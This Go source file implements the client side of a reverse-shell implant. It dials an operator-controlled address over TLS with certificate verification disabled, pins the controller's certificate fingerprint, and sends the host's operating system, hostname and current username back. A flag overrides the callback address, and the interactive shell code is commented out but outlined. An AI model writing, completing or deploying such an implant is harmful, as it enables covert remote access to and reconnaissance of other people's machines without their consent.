package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/user"
	"runtime"
	"strings"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

func main() {
	dev := flag.Bool("dev", false, "Run the shell locally")
	override := flag.String("connect", "", "Override compile-time-injected connectString")
	flag.Parse()

	if *dev {
		startShell(os.Stdin)
	}

	connectString := "127.0.0.1:9000"
	fingerPrint := "A7:E2:E9:24:96:FA:B9:22:EA:37:65:FE:AC:98:C5:17:B2:83:30:4C:EC:27:EF:D2:BD:F6:4E:5C:5B:2A:D5:A7"

	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		_ = bytesFingerprint
		if err != nil {
			fmt.Println(err)
			os.Exit(ErrCouldNotDecode)
		}

		if *override == "" {
			fmt.Println("1")
			initReverseShell(connectString, bytesFingerprint)
		} else {
			fmt.Println("2")
			initReverseShell(*override, bytesFingerprint)
		}
	}
	fmt.Println("Exit chill")
}

var Conn Writer

type Writer interface {
	Write(s []byte) (int, error)
	Read(s []byte) (int, error)
	Close() error
}

func Send(conn Writer, msg string) {
	conn.Write([]byte(msg))
	conn.Write([]byte("\n"))
}

func initReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", connectString, config)
	if err != nil {
		os.Exit(ErrHostUnreachable)
	}
	defer conn.Close()

	ok := isValidKey(conn, fingerprint)
	if !ok {
		os.Exit(ErrBadFingerprint)
	}

	Conn = conn
	fmt.Println("Start Shell !")
	// time.Sleep(1138800 * time.Hour)
	startShell(conn)
}

func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid
}

func startShell(conn Writer) {
	// hostname, _ := os.Hostname()

	fmt.Println("hostname go go")

	// sh := ishell.NewWithConfig(&readline.Config{
	// 	Prompt:      fmt.Sprintf("[%s]> ", hostname),
	// 	Stdin:       conn,
	// 	StdinWriter: conn,
	// 	Stdout:      conn,
	// 	Stderr:      conn,
	// 	VimMode:     true,
	// })

	// TODO
	// Add new commands to manager when join session (not here !)
	//registerCommands(sh)

	Send(conn, getBasicInfo())
	// sh.Run()
	// os.Exit(0)
}

func getBasicInfo() string {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	os := runtime.GOOS
	return fmt.Sprintf("%s - %s - %s", os, hostname, user.Username)
}
